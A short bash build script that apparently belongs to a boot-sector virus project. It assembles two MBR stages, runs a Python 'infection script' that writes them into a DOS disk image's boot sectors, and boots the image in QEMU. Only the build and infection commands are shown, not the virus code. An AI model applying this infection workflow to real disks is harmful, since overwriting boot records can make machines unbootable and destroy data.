#!/bin/bash


nasm -f bin -o michelange1ststage.mbr michelange_grafx_poly_melt_boot.asm
nasm -f bin -o michelange2ndstage.bin michelange_grafx_poly_2nd_stage.asm

#Run python infection script with target image
python3 infect_mbr_reanimator.py -mbr michelange1ststage.mbr -vxpaint michelange2ndstage.bin -ogmbr michelange_parttable_test_0 -diskimg dos_rip.img -sector 0 -ogmbrsector 2 -vxpaintsector 3

#qemu-system-i386 -m 16 -k en-us -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img
qemu-system-i386 -m 16 -device cirrus-vga -display gtk -drive file=dos_rip.img,format=raw,index=0,media=disk


